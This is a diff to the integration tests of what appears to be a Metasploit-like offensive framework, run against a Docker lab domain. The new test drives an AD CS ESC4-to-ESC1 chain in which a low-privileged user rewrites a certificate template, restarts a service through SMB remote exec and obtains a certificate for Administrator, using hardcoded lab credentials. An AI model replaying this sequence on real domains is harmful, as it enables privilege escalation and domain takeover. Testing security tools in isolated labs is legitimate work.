@@ -883,7 +883,9 @@ class TestProcWatchLab(unittest.TestCase):
             self.assertFalse(t.is_alive(), "watcher did not finish")
             out = buf.getvalue()
             self.assertNotIn("Traceback", out)
-            self.assertIn("service started", out)
+            # the exec side's always-on status line (the "started" string
+            # is a debug-only print — never assert on that one)
+            self.assertIn("launched", out)
             self.assertIn("cmd.exe", out)
             loot = console.store.loot("proc-watch")
             self.assertEqual(len(loot), 1)
@@ -3020,8 +3022,25 @@ class TestAddComputerRbcdLab(unittest.TestCase):
             "run",
         )
         self.assertNotIn("Traceback", out)
-        # web_svc's SID is in backup_svc's RBCD SD (fixture 20)
-        self.assertIn("-1107", out)
+        # web_svc's SID is in backup_svc's RBCD SD (fixture 20) — the RID
+        # shifts with provision order, so look it up live
+        from impacket.ldap import ldap as impacket_ldap
+        from impacket.ldap import ldapasn1
+        conn = impacket_ldap.LDAPConnection(f"ldap://{HOST}")
+        conn.login("Administrator", "P@ssw0rd123", "forge.local")
+        sid = None
+        for packet in conn.search(
+                searchBase="DC=forge,DC=local",
+                searchFilter="(sAMAccountName=web_svc)",
+                attributes=["objectSid"]):
+            if isinstance(packet, ldapasn1.SearchResultEntry):
+                for a in packet["attributes"]:
+                    if str(a["type"]) == "objectSid":
+                        from impacket.ldap.ldaptypes import LDAP_SID
+                        sid = LDAP_SID(bytes(a["vals"][0])).formatCanonical()
+        conn.close()
+        self.assertIsNotNone(sid)
+        self.assertIn(sid, out)
 
     def test_rbcd_set_system_only_denial(self):
         out, _ = self._run(
@@ -3469,6 +3488,131 @@ class TestHostPackLab(unittest.TestCase):
         )
         self.assertNotIn("Traceback", out)
         self.assertIn("Microsoft Defender: RUNNING", out)
+
+
+@unittest.skipUnless(docker_available(), "docker daemon not available")
+@unittest.skipUnless(impacket_available(), "impacket not installed")
+@unittest.skipUnless(windows_lab_enabled(), "set FORGE_WINDOWS_LAB=1 to enable")
+class TestEsc4Lab(unittest.TestCase):
+    """The full ESC4 chain on the domain lab: analyst (write on the
+    WeakWeb fixture) rewrites it into ESC1 shape, enrolls as
+    Administrator via esc1, and clear restores the template exactly."""
+
+    @classmethod
+    def setUpClass(cls):
+        from impacket.smbconnection import SMBConnection
+
+        cls.manager = LabManager(ROOT / "labs")
+        cls.manager.up("domain")
+        deadline = time.time() + 3600
+        while time.time() < deadline:
+            try:
+                conn = SMBConnection(HOST, HOST, sess_port=4445, timeout=10)
+                conn.login("Administrator", "P@ssw0rd123", "forge.local")
+                buf = []
+                conn.getFile("C$", r"OEM\CA-READY.txt", buf.append)
+                raw = b"".join(buf)
+                text = (raw[2:].decode("utf-16-le", "replace").strip()
+                        if raw.startswith(b"\xff\xfe")
+                        else raw.decode("utf-8", "replace").strip())
+                if text == "ready":
+                    conn.close()
+                    break
+                conn.close()
+            except Exception:
+                time.sleep(20)
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.manager.down("domain")
+
+    def _run(self, console, *commands):
+        buf = io.StringIO()
+        with contextlib.redirect_stdout(buf):
+            for command in commands:
+                console.onecmd(command)
+        return buf.getvalue()
+
+    def test_esc4_chain(self):
+        registry = ModuleRegistry(ROOT / "modules")
+        registry.load()
+        console = FrameworkConsole(registry, Store(":memory:"))
+        try:
+            # 1. check: WeakWeb starts non-ESC1
+            out = self._run(
+                console,
+                "use auxiliary/attack/esc4",
+                f"set RHOSTS {HOST}",
+                "set DOMAIN forge.local",
+                "set USERNAME analyst",
+                "set PASSWORD Summer2024!",
+                "set TARGET WeakWeb",
+                "set ACTION check",
+                "run",
+            )
+            self.assertNotIn("Traceback", out)
+            self.assertIn("not ESC1-ready", out)
+
+            # 2. set: analyst rewrites it
+            out = self._run(console, "set ACTION set", "run")
+            self.assertNotIn("Traceback", out)
+            self.assertIn("rewritten into ESC1 shape", out)
+            self.assertIn("verified ESC1-ready", out)
+
+            # 3. certsvc restart so the CA's template cache picks it up
+            out = self._run(
+                console,
+                "use exploits/windows/smb_exec",
+                f"set RHOSTS {HOST}",
+                "set RPORT 4445",
+                "set USERNAME labadmin",
+                "set PASSWORD Labpass2024!",
+                "set COMMAND powershell Restart-Service certsvc",
+                "run",
+            )
+            self.assertNotIn("Traceback", out)
+            time.sleep(15)
+
+            # 4. esc1 as analyst against the reshaped template — the CA
+            # can take a moment after the restart (retry the window)
+            out = ""
+            for _attempt in range(15):
+                out = self._run(
+                    console,
+                    "use auxiliary/attack/esc1",
+                    f"set RHOSTS {HOST}",
+                    "set RPORT 4445",
+                    f"set CA_HOST {HOST}",
+                    "set DOMAIN forge.local",
+                    "set USERNAME analyst",
+                    "set PASSWORD Summer2024!",
+                    "set TEMPLATE WeakWeb",
+                    "run",
+                )
+                if "cert issued for Administrator@forge.local" in out:
+                    break
+                time.sleep(30)
+            self.assertNotIn("Traceback", out)
+            self.assertIn("cert issued for Administrator@forge.local", out)
+
+            # 5. clear: the template goes back to the fixture shape
+            out = self._run(
+                console,
+                "use auxiliary/attack/esc4",
+                f"set RHOSTS {HOST}",
+                "set DOMAIN forge.local",
+                "set USERNAME analyst",
+                "set PASSWORD Summer2024!",
+                "set TARGET WeakWeb",
+                "set ACTION clear",
+                "run",
+            )
+            self.assertNotIn("Traceback", out)
+            self.assertIn("restored from backup", out)
+            out = self._run(console, "set ACTION check", "run")
+            self.assertIn("not ESC1-ready", out)
+        finally:
+            console.store.close()
 
 
 @unittest.skipUnless(docker_available(), "docker daemon not available")
